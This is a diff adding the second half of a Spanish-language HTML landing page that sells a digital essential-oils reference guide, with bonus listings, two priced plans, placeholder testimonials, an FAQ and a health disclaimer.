+          <li>300 protocolos ilustrados</li>
+          <li>Guía de sustitución de aceites</li>
+          <li>Manual completo de diluciones</li>
+          <li>Tabla de aplicaciones y precauciones</li>
+          <li>Nombres comunes y botánicos</li>
+          <li>Sinergias y combinaciones</li>
+          <li>PDF de alta resolución para imprimir</li>
+          <li>Versión optimizada para celular</li>
+          <li>Acceso de por vida en el Plan Completo</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-ivory" id="bonos">
+    <div class="container">
+      <div class="section-intro text-center">
+        <div class="eyebrow">Y eso no es todo</div>
+        <h2>También vas a recibir 7 bonos exclusivos</h2>
+        <p>Materiales complementarios creados para ampliar y simplificar la consulta diaria.</p>
+      </div>
+      <div class="bonus-grid">
+        <article class="bonus-card"><div class="bonus-cover"><img src="assets/bonus-1-kit-sos.png" alt="Mockup del Bono 1 Kit SOS Aromático" loading="lazy"></div><div class="bonus-content"><span class="bonus-label">BONO 1</span><h3>Kit SOS Aromático</h3><p>30 fichas rápidas para situaciones comunes, con protocolo visual y cuidados.</p><ul><li>30 fichas ilustradas</li><li>Consulta por situación</li><li>Formato móvil e imprimible</li></ul><span class="bonus-value">Valor: US$ 9.90</span><span class="free">GRATIS</span></div></article>
+        <article class="bonus-card"><div class="bonus-cover"><img src="assets/bonus-2-precauciones.png" alt="Mockup del Bono 2 Guía de Precauciones" loading="lazy"></div><div class="bonus-content"><span class="bonus-label">BONO 2</span><h3>Precauciones y Aplicaciones de Riesgo</h3><p>Infografías sobre fotosensibilidad, zonas sensibles y situaciones que requieren atención.</p><ul><li>Cuidados por categoría</li><li>Aplicaciones que deben evitarse</li><li>Alertas claramente identificadas</li></ul><span class="bonus-value">Valor: US$ 8.90</span><span class="free">GRATIS</span></div></article>
+        <article class="bonus-card"><div class="bonus-cover"><img src="assets/bonus-3-sueno.png" alt="Mockup del Bono 3 Ritual Aromático del Sueño" loading="lazy"></div><div class="bonus-content"><span class="bonus-label">BONO 3</span><h3>Ritual Aromático del Sueño</h3><p>Una rutina visual de 14 noches para crear un ambiente nocturno más tranquilo.</p><ul><li>Plan noche a noche</li><li>Combinaciones y diluciones</li><li>Ritual previo al descanso</li></ul><span class="bonus-value">Valor: US$ 9.90</span><span class="free">GRATIS</span></div></article>
+        <article class="bonus-card"><div class="bonus-cover"><img src="assets/bonus-4-sinergias.png" alt="Mockup del Bono 4 50 Sinergias" loading="lazy"></div><div class="bonus-content"><span class="bonus-label">BONO 4</span><h3>50 Sinergias para Cada Momento</h3><p>Combinaciones aromáticas organizadas para calma, concentración, energía and ambiente.</p><ul><li>50 fórmulas visuales</li><li>Organización por momento</li><li>Alternativas de sustitución</li></ul><span class="bonus-value">Valor: US$ 9.90</span><span class="free">GRATIS</span></div></article>
+        <article class="bonus-card"><div class="bonus-cover"><img src="assets/bonus-5-hogar.png" alt="Mockup del Bono 5 Aromaterapia en Casa" loading="lazy"></div><div class="bonus-content"><span class="bonus-label">BONO 5</span><h3>Aromaterapia para Cada Ambiente</h3><p>Ideas visuales para crear distintas atmósferas en los espacios cotidianos.</p><ul><li>Dormitorio y sala</li><li>Espacio de trabajo</li><li>Baño y zonas comunes</li></ul><span class="bonus-value">Valor: US$ 7.90</span><span class="free">GRATIS</span></div></article>
+        <article class="bonus-card"><div class="bonus-cover"><img src="assets/bonus-6-botiquin.png" alt="Mockup del Bono 6 Botiquín Aromático Inteligente" loading="lazy"></div><div class="bonus-content"><span class="bonus-label">BONO 6</span><h3>Botiquín Aromático Inteligente</h3><p>Organiza un kit funcional con aceites versátiles, fichas de inventario y sustituciones.</p><ul><li>Lista de esenciales</li><li>Control de inventario</li><li>Mapa de sustituciones</li></ul><span class="bonus-value">Valor: US$ 7.90</span><span class="free">GRATIS</span></div></article>
+        <article class="bonus-card"><div class="bonus-cover"><img src="assets/bonus-7-fichas.png" alt="Mockup del Bono 7 Fichas Rápidas Imprimibles" loading="lazy"></div><div class="bonus-content"><span class="bonus-label">BONO 7</span><h3>Fichas Rápidas Imprimibles</h3><p>Etiquetas, tablas de consulta, índice y fichas para registrar tus preparaciones.</p><ul><li>Etiquetas organizativas</li><li>Tablas de bolsillo</li><li>Fichas de preparación</li></ul><span class="bonus-value">Valor: US$ 6.90</span><span class="free">GRATIS</span></div></article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-white" id="oferta">
+    <div class="container">
+      <div class="section-intro text-center">
+        <div class="eyebrow">⏰ Oferta especial</div>
+        <h2>Elige la opción ideal para ti</h2>
+        <p>Un único pago. Acceso digital inmediato.</p>
+      </div>
+      <div class="pricing-grid">
+        <article class="price-card">
+          <div class="plan-name">PLAN BÁSICO</div>
+          <div class="plan-mockup"><img src="assets/mockup-plan-basico.png" alt="Mockup del Plan Básico con 50 protocolos" loading="lazy"></div>
+          <ul class="price-list">
+            <li class="included">50 protocolos visuales</li>
+            <li class="included">Aplicaciones con 6 aceites esenciales</li>
+            <li class="included">Cantidades y diluciones esenciales</li>
+            <li class="included">Acceso digital inmediato</li>
+            <li class="locked">300 protocolos visuales</li>
+            <li class="locked">Guía completa de sustituciones</li>
+            <li class="locked">Manual completo de diluciones</li>
+            <li class="locked">Tabla de aplicaciones y cuidados</li>
+            <li class="locked">Sinergias y combinaciones</li>
+            <li class="locked">Acceso de por vida</li>
+            <li class="locked">Los 7 bonos exclusivos</li>
+          </ul>
+          <p class="old-price">Antes: US$ 19.90</p>
+          <div class="price">US$ 7.90</div>
+          <p class="payment">Pago único</p>
+          <a class="btn btn--wide btn--outline-black" href="https://pay.hotmart.com/Q107620155V">QUIERO EL PLAN BÁSICO</a>
+          <p class="currency-note">🌎 En el checkout, el valor se mostrará en la moneda disponible para tu región.</p>
+        </article>
+
+        <article class="price-card price-card--featured">
+          <div class="popular-ribbon">⚡ MÁS VENDIDO · 6X MÁS CONTENIDO</div>
+          <div class="plan-name">PLAN COMPLETO</div>
+          <div class="plan-mockup"><img src="assets/mockup-plan-completo.png" alt="Mockup del Plan Completo con 300 protocolos y 7 bonos" loading="lazy"></div>
+          <ul class="price-list">
+            <li class="included">300 protocolos visuales explicados</li>
+            <li class="included">Guía completa de sustitución</li>
+            <li class="included">Manual completo de diluciones</li>
+            <li class="included">Tabla de aplicaciones y precauciones</li>
+            <li class="included">Sinergias y combinaciones</li>
+            <li class="included">Índice rápido por objetivo y aceite</li>
+            <li class="included">PDF para imprimir</li>
+            <li class="included">Versión optimizada para celular</li>
+            <li class="included">Acceso de por vida</li>
+            <li class="included">Garantía de 7 días</li>
+            <li class="included">7 bonos exclusivos incluidos</li>
+          </ul>
+          <p class="old-price">Antes: US$ 67.00</p>
+          <div class="price">US$ 14.90</div>
+          <p class="payment">Pago único</p>
+          <a class="btn btn--wide" href="https://pay.hotmart.com/W107620180O">QUIERO EL PLAN COMPLETO</a>
+          <p class="currency-note">🌎 En el checkout, el valor se mostrará en la moneda disponible para tu región.</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-ivory">
+    <div class="container">
+      <div class="section-intro text-center">
+        <h2>Experiencias con el Atlas Visual</h2>
+        <p>Antes de publicar, sustituye estos espacios por testimonios auténticos de compradores.</p>
+      </div>
+      <div class="testimonial-grid">
+        <article class="testimonial"><div class="stars">★★★★★</div><blockquote>“Espacio reservado para un testimonio real sobre la facilidad de consultar las proporciones y aplicaciones.”</blockquote><small>— Luciana Valenzuela</small></article>
+        <article class="testimonial"><div class="stars">★★★★★</div><blockquote>“Espacio reservado para un testimonio real sobre la utilidad de las sustituciones y los cuidados.”</blockquote><small>— Mateo Alarcón</small></article>
+        <article class="testimonial"><div class="stars">★★★★★</div><blockquote>“Espacio reservado para un testimonio real sobre el formato visual, móvil e imprimible.”</blockquote><small>— Isadora Benavídez</small></article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-white">
+    <div class="container--narrow">
+      <div class="guarantee">
+        <div class="seal">100%<br>GARANTÍA<br>7 DÍAS</div>
+        <div>
+          <div class="eyebrow">Tu compra está protegida</div>
+          <h2>Tienes 7 días para conocer el material</h2>
+          <p>Si accedes al Atlas Visual y consideras que no corresponde a lo que buscabas, puedes solicitar el reembolso dentro del plazo establecido.</p>
+          <p><strong>El riesgo queda de nuestro lado.</strong></p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-ivory">
+    <div class="container">
+      <div class="section-intro text-center"><h2>Cómo funciona el acceso</h2><p>Simple, digital y sin complicaciones.</p></div>
+      <div class="steps">
+        <article class="step"><h3>Completa tu compra</h3><p>Elige el plan y finaliza el pago mediante el checkout seguro.</p></article>
+        <article class="step"><h3>Recibe el acceso</h3><p>Después de la aprobación, recibirás las instrucciones por correo electrónico.</p></article>
+        <article class="step"><h3>Descarga los materiales</h3><p>Guarda los archivos en tu celular, computadora o tablet.</p></article>
+        <article class="step"><h3>Consulta o imprime</h3><p>Utiliza el Atlas en pantalla o crea tu propia carpeta física.</p></article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-white">
+    <div class="container author-card">
+      <div class="author-photo"><img src="assets/ana-valentina-lima.png" alt="Ana Valentina Lima, curadora del Atlas Visual" loading="lazy"></div>
+      <div>
+        <div class="eyebrow">Sobre la curaduría</div>
+        <h2>Ana Valentina Lima</h2>
+        <h3>Investigación, organización y curaduría educativa de protocolos visuales de aromaterapia.</h3>
+        <p>Ana Valentina Lima reunió y organizó información sobre aceites esenciales, diluciones, formas de aplicación, combinaciones y cuidados para transformarla en un sistema de consulta más claro y accesible.</p>
+        <p>El propósito del Atlas es facilitar la organización del conocimiento y permitir que cada indicación esencial pueda encontrarse en pocos segundos.</p>
+        <p class="author-quote">“Mi objetivo es ayudarte a aprovechar mejor los aceites que ya tienes, con información clara, visual and organizada.”</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-ivory">
+    <div class="container--narrow">
+      <div class="section-intro text-center"><h2>Preguntas frecuentes</h2></div>
+      <div class="faq">
+        <details><summary>1. ¿Este material sirve para principiantes?</summary><p>Sí. Está organizado para facilitar la consulta de quienes todavía no se sienten seguros con cantidades, diluciones y formas de aplicación.</p></details>
+        <details><summary>2. ¿Puedo acceder desde el celular?</summary><p>Sí. Los materiales digitales estarán optimizados para su consulta desde celular, computadora o tablet.</p></details>
+        <details><summary>3. ¿El acceso es inmediato?</summary><p>Sí. Una vez aprobado el pago, recibirás por correo electrónico las instrucciones de acceso.</p></details>
+        <details><summary>4. ¿Los materiales se pueden imprimir?</summary><p>Sí. Los PDF estarán preparados en alta resolución para que puedas imprimirlos.</p></details>
+        <details><summary>5. ¿Los 7 bonos están incluidos?</summary><p>Los siete bonos están incluidos exclusivamente en el Plan Completo.</p></details>
+        <details><summary>6. ¿Necesito conocimientos avanzados?</summary><p>No. La propuesta es convertir información técnica en fichas visuales fáciles de consultar.</p></details>
+        <details><summary>7. ¿Existe una mensualidad?</summary><p>No. El valor mostrado corresponde a un único pago.</p></details>
+        <details><summary>8. ¿Necesito tener todos los aceites?</summary><p>No. La guía de sustituciones del Plan Completo te ayudará a identificar alternativas cuando no tengas el aceite principal.</p></details>
+        <details><summary>9. ¿Los aceites físicos están incluidos?</summary><p>No. Se trata de un producto exclusivamente digital. No se enviarán productos físicos.</p></details>
+        <details><summary>10. ¿Cómo funciona la garantía?</summary><p>Dispones de siete días después de la compra para evaluar el material y solicitar el reembolso conforme a las condiciones de la plataforma.</p></details>
+        <details><summary>11. ¿El Atlas recomienda ingerir aceites esenciales?</summary><p>No. El material no enseña ni recomienda la ingestión de aceites esenciales.</p></details>
+        <details><summary>12. ¿Este material sustituye una orientación profesional?</summary><p>No. Tiene fines exclusivamente educativos y no sustituye diagnóstico, tratamiento ni orientación individual de un profesional cualificado.</p></details>
+      </div>
+      <div class="text-center" style="margin-top:38px"><a class="btn" href="#oferta">QUIERO ACCEDER AHORA</a></div>
+    </div>
+  </section>
+
+  <section class="final-cta bg-green">
+    <div class="container--narrow">
+      <h2>Deja de tener tus aceites guardados sin saber cómo utilizarlos</h2>
+      <p>Ten 300 protocolos visuales para consultar cuando los necesites, junto con siete materiales complementarios.</p>
+      <a class="btn" href="#oferta">QUIERO EL ATLAS VISUAL</a>
+    </div>
+  </section>
+
+  <footer>
+    <div class="container">
+      <h3>Atlas Visual de los Aceites Esenciales</h3>
+      <div class="footer-links">
+        <a href="#">Aviso legal</a><a href="#">Política de privacidad</a><a href="#">Términos de uso</a>
+      </div>
+      <p><strong>Aviso:</strong> Este producto tiene fines educativos. La información no sustituye la orientación, el diagnóstico ni el tratamiento de un profesional cualificado. Los aceites esenciales son sustancias concentradas y deben utilizarse con precaución. Ante embarazo, lactancia, uso en niños, animales, personas mayores, condiciones médicas o medicación, consulta previamente a un profesional cualificado.</p>
+      <p>© <span id="year"></span> Atlas Visual de los Aceites Esenciales. Todos los derechos reservados.</p>
+    </div>
+  </footer>
+
+  <script>
+    const now = new Date();
+    document.getElementById('today-date').textContent = new Intl.DateTimeFormat('es', { day: '2-digit', month: '2-digit', year: 'numeric' }).format(now);
+    document.getElementById('year').textContent = now.getFullYear();
+  </script>
+</body>
+</html>
